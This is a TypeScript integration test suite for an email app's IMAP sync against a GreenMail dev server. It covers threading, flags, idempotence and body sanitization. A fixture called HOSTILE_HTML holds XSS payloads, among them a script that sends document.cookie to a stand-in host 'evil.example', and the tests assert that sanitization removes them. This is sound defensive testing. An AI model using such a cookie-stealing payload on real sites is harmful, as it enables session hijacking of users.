import { and, asc, eq } from "drizzle-orm";
import { ImapFlow } from "imapflow";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import type { Db } from "../db/client.js";
import { correspondents, folders, messages, threads } from "../db/schema.js";
import { deriveCredentialKey } from "../mail-accounts/credential-crypto.js";
import {
  getMailAccountForUser,
  type MailAccountRow,
  markNeedsReauth,
} from "../mail-accounts/store.js";
import { createTestDb, resetTestDb, TEST_MAIL_CREDENTIAL_KEY } from "../test-support/db.js";
import { createTestMailAccount } from "../test-support/mail-account.js";
import { buildTestMessage } from "../test-support/mime.js";
import { withMailAccountConnection } from "./imap-connection.js";
import { type IngestedMessage, ingestFolder } from "./ingest.js";
import { syncMailAccount } from "./sync-account.js";

/**
 * The acceptance bar of #34, end to end against the GreenMail dev server
 * (compose.dev.yaml, docs/dev-setup.md) — a real IMAP conversation, not a
 * stub: connect, discover folders, ingest headers newest-first, assemble
 * Threads, carry read/star state across, derive Snippets, and sanitize
 * bodies at ingest.
 */
const IMAP_HOST = process.env.IMAP_TEST_HOST ?? "localhost";
const IMAP_PORT = Number(process.env.IMAP_TEST_PORT ?? 3143);

const OWNER = "vic@mail.test";
const ALICE = "Alice Anderson <alice@example.test>";
const CAROL = "Carol Chen <carol@example.test>";

/** A reply whose plain text and HTML both carry history that must not reach the Snippet. */
const QUOTED_TEXT = [
  "Tuesday works for me.",
  "",
  "On Mon, 3 Mar 2025 at 09:12, Alice Anderson <alice@example.test> wrote:",
  "> Are we still on for Tuesday?",
].join("\n");

const HOSTILE_HTML = [
  "<html><body>",
  "<p>Tuesday works for me.</p>",
  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
  '<img src="https://cdn.example/pixel.gif" onerror="alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  "<blockquote><p>Are we still on for Tuesday?</p></blockquote>",
  "</body></html>",
].join("\n");

let db: Db;
let closeDb: () => Promise<void>;
let account: MailAccountRow;

function at(day: number): Date {
  return new Date(Date.UTC(2025, 2, day, 9, 0, 0));
}

/** A fresh mailbox per run: GreenMail creates an account on first login. */
async function seedMailbox(emailAddress: string): Promise<void> {
  const client = new ImapFlow({
    host: IMAP_HOST,
    port: IMAP_PORT,
    secure: false,
    auth: { user: emailAddress, pass: "anything" },
    logger: false,
  });
  await client.connect();
  try {
    await client.mailboxCreate("Archive");

    await client.append(
      "INBOX",
      buildTestMessage({
        from: ALICE,
        to: OWNER,
        subject: "Quarterly numbers",
        date: at(1),
        messageId: "a@example.test",
        text: "Here are the numbers.",
      }),
      [],
      at(1),
    );

    await client.append(
      "INBOX",
      buildTestMessage({
        from: CAROL,
        to: OWNER,
        subject: "Re: Quarterly numbers",
        date: at(2),
        messageId: "b@example.test",
        inReplyTo: "a@example.test",
        references: ["a@example.test"],
        text: "Got them, thanks.",
      }),
      // Already read and starred on the server, by another IMAP client.
      ["\\Seen", "\\Flagged"],
      at(2),
    );

    await client.append(
      "INBOX",
      buildTestMessage({
        from: CAROL,
        to: OWNER,
        subject: "Re: Lunch?",
        date: at(3),
        messageId: "c@example.test",
        text: QUOTED_TEXT,
        html: HOSTILE_HTML,
      }),
      [],
      at(3),
    );

    await client.append(
      "Archive",
      buildTestMessage({
        from: ALICE,
        to: OWNER,
        subject: "Old thing",
        date: at(0),
        messageId: "d@example.test",
        text: "Filed away.",
      }),
      [],
      at(0),
    );
  } finally {
    await client.logout().catch(() => undefined);
    client.close();
  }
}

beforeEach(async () => {
  const created = await createTestDb();
  db = created.db;
  closeDb = () => created.sql.end();
  await resetTestDb(db);
  // A distinct address per test: GreenMail keeps mailboxes for the lifetime
  // of the container, so reusing one would inherit a previous run's messages.
  const emailAddress = `sync-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@mail.test`;
  await seedMailbox(emailAddress);
  account = await createTestMailAccount(db, {
    emailAddress,
    imapHost: IMAP_HOST,
    imapPort: IMAP_PORT,
  });
});

afterAll(async () => {
  await closeDb?.();
});

describe("syncMailAccount against GreenMail", () => {
  it("discovers folders, ingests newest-first, and assembles Threads", async () => {
    const result = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });
    expect(result.status).toBe("synced");

    const stored = await db.select().from(folders).where(eq(folders.mailAccountId, account.id));
    const byPath = new Map(stored.map((row) => [row.path, row]));

    expect([...byPath.keys()].sort()).toEqual(["Archive", "INBOX"]);
    expect(byPath.get("INBOX")?.role).toBe("inbox");
    // UIDVALIDITY is recorded on the first pass — it is what invalidates
    // every stored UID if the server ever changes it.
    expect(byPath.get("INBOX")?.uidValidity).toBeGreaterThan(0);
    expect(byPath.get("INBOX")?.lastSyncedAt).not.toBeNull();

    // Every folder's messages arrived, keyed by Mail Account.
    const all = await db.select().from(messages).where(eq(messages.mailAccountId, account.id));
    expect(all).toHaveLength(4);

    // The reply and its parent are one Thread; the unrelated mail are not.
    const conversation = await db
      .select()
      .from(threads)
      .where(eq(threads.mailAccountId, account.id));
    expect(conversation).toHaveLength(3);

    const quarterly = conversation.find((thread) => thread.subject === "Quarterly numbers");
    expect(quarterly?.messageCount).toBe(2);
    expect(quarterly?.participants.map((p) => p.address).sort()).toEqual([
      "alice@example.test",
      "carol@example.test",
    ]);

    // Newest-first is asserted at the ingest boundary rather than inferred
    // from the stored rows: a batched pass over the INBOX must hand its
    // batches over in strictly descending UID order, newest batch first.
    const inbox = byPath.get("INBOX");
    if (!inbox) throw new Error("INBOX was not discovered");
    const order: IngestedMessage[] = [];
    await withMailAccountConnection(
      db,
      account,
      { credentialKey: deriveCredentialKey(TEST_MAIL_CREDENTIAL_KEY) },
      (client) =>
        ingestFolder(db, client, inbox, {
          batchSize: 2,
          onBatch: (batch) => {
            order.push(...batch);
          },
        }),
    );
    const uids = order.map((message) => message.uid);
    expect(uids).toHaveLength(3);
    expect([...uids].sort((left, right) => right - left)).toEqual(uids);
  });

  it("rebuilds a folder from scratch when its UIDVALIDITY changes", async () => {
    await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
      roles: ["inbox"],
    });
    const before = await db.select().from(messages).where(eq(messages.mailAccountId, account.id));
    expect(before).toHaveLength(3);

    // Stand in for the server reissuing the mailbox: every stored UID is now
    // meaningless (RFC 3501 §2.3.1.1), so the folder has to be re-ingested.
    await db
      .update(folders)
      .set({ uidValidity: 1 })
      .where(and(eq(folders.mailAccountId, account.id), eq(folders.path, "INBOX")));

    const result = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
      roles: ["inbox"],
    });
    if (result.status !== "synced") throw new Error("expected a sync");

    expect(result.ingest[0]?.rebuilt).toBe(true);
    expect(result.ingest[0]?.created).toBe(3);
    const after = await db.select().from(messages).where(eq(messages.mailAccountId, account.id));
    expect(after).toHaveLength(3);
    expect(after.map((row) => row.id).sort()).not.toEqual(before.map((row) => row.id).sort());
  });

  it("carries the mail server's existing read and star state across", async () => {
    await syncMailAccount(db, account, { mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY });

    const [read] = await db
      .select()
      .from(messages)
      .where(
        and(eq(messages.mailAccountId, account.id), eq(messages.messageIdHeader, "b@example.test")),
      );
    expect(read).toMatchObject({ seen: true, flagged: true });
    expect(read?.flags).toEqual(expect.arrayContaining(["\\Seen", "\\Flagged"]));

    const [unread] = await db
      .select()
      .from(messages)
      .where(
        and(eq(messages.mailAccountId, account.id), eq(messages.messageIdHeader, "a@example.test")),
      );
    expect(unread).toMatchObject({ seen: false, flagged: false });

    // The Star rolls up to the Thread the list actually renders.
    const [thread] = await db
      .select()
      .from(threads)
      .where(eq(threads.id, read?.threadId ?? ""));
    expect(thread).toMatchObject({ starred: true, unreadCount: 1, messageCount: 2 });
  });

  it("leaves bodies and Snippets to the backfill sweep until they are asked for", async () => {
    await syncMailAccount(db, account, { mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY });

    const rows = await db.select().from(messages).where(eq(messages.mailAccountId, account.id));
    for (const row of rows) {
      expect(row.bodyFetchedAt).toBeNull();
      expect(row.bodyText).toBeNull();
      expect(row.snippet).toBeNull();
    }
  });

  it("sanitizes fetched bodies and derives a Snippet with the quoted history stripped", async () => {
    await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
      roles: ["inbox"],
      fetchBodies: true,
    });

    const [reply] = await db
      .select()
      .from(messages)
      .where(
        and(eq(messages.mailAccountId, account.id), eq(messages.messageIdHeader, "c@example.test")),
      );
    if (!reply) throw new Error("the quoted reply was not ingested");

    // Sanitized at ingest: the store never holds the sender's script.
    expect(reply.bodyHtml).not.toContain("script");
    expect(reply.bodyHtml).not.toContain("evil.example");
    expect(reply.bodyHtml).not.toContain("onerror");
    expect(reply.bodyHtml).not.toContain("javascript:");
    expect(reply.bodyHtml).toContain("Tuesday works for me.");

    // Derived once, quoted history stripped.
    expect(reply.snippet).toBe("Tuesday works for me.");
    expect(reply.bodyFetchedAt).not.toBeNull();
    // The raw text alternative is kept whole — only the Snippet is trimmed.
    expect(reply.bodyText).toContain("Are we still on for Tuesday?");

    // A second pass must not re-derive it (CONTEXT.md: derived once).
    await db.update(messages).set({ snippet: "pinned by hand" }).where(eq(messages.id, reply.id));
    await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
      roles: ["inbox"],
      fetchBodies: true,
    });
    const [again] = await db.select().from(messages).where(eq(messages.id, reply.id));
    expect(again?.snippet).toBe("pinned by hand");
  });

  it("is idempotent: a second sync updates rows instead of duplicating them", async () => {
    const first = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });
    const second = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });

    if (first.status !== "synced" || second.status !== "synced") {
      throw new Error("expected both passes to sync");
    }
    expect(first.ingest.reduce((sum, folder) => sum + folder.created, 0)).toBe(4);
    expect(second.ingest.reduce((sum, folder) => sum + folder.created, 0)).toBe(0);

    const rows = await db
      .select()
      .from(messages)
      .where(eq(messages.mailAccountId, account.id))
      .orderBy(asc(messages.uid));
    expect(rows).toHaveLength(4);

    const conversation = await db
      .select()
      .from(threads)
      .where(eq(threads.mailAccountId, account.id));
    expect(conversation).toHaveLength(3);
  });

  it("builds the Correspondent aggregate as mail syncs, and never double-counts a re-sync (#49)", async () => {
    const first = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });
    if (first.status !== "synced") throw new Error("expected a sync");

    const rows = await db
      .select()
      .from(correspondents)
      .where(eq(correspondents.mailAccountId, account.id));
    const byAddress = new Map(rows.map((row) => [row.normalizedAddress, row]));

    // Every message ingested here landed in INBOX or Archive (both
    // "received" folders) — Alice appears twice (once per folder), Carol
    // twice (both in INBOX).
    expect(byAddress.get("alice@example.test")).toMatchObject({ sentCount: 0, receivedCount: 2 });
    expect(byAddress.get("carol@example.test")).toMatchObject({ sentCount: 0, receivedCount: 2 });

    const second = await syncMailAccount(db, account, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });
    if (second.status !== "synced") throw new Error("expected a second sync");

    const afterResync = await db
      .select()
      .from(correspondents)
      .where(eq(correspondents.mailAccountId, account.id));
    const afterByAddress = new Map(afterResync.map((row) => [row.normalizedAddress, row]));
    // A re-sync only refreshes flags/headers (`ingest.ts`'s update branch) —
    // it must never re-count activity already recorded.
    expect(afterByAddress.get("alice@example.test")?.receivedCount).toBe(2);
    expect(afterByAddress.get("carol@example.test")?.receivedCount).toBe(2);
  });

  it("never parks an account in Needs Reauth over an unreachable server", async () => {
    // The two failure modes must not share a path (ADR-0011): a server that
    // is down is retried, a rejected credential is not. Only the second may
    // stop the account.
    const unreachable = { ...account, imapPort: 1 };

    await expect(
      syncMailAccount(db, unreachable, { mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY }),
    ).rejects.toThrow();

    const stored = await getMailAccountForUser(db, account.userId, account.id);
    expect(stored?.status).toBe("active");
  });

  it("refuses to sync a Mail Account parked in Needs Reauth", async () => {
    await markNeedsReauth(db, account.id);
    const parked = { ...account, status: "needs_reauth" as const };

    const result = await syncMailAccount(db, parked, {
      mailCredentialKey: TEST_MAIL_CREDENTIAL_KEY,
    });

    expect(result).toEqual({ status: "needs_reauth", mailAccountId: account.id });
    const rows = await db.select().from(messages).where(eq(messages.mailAccountId, account.id));
    expect(rows).toHaveLength(0);
  });
});
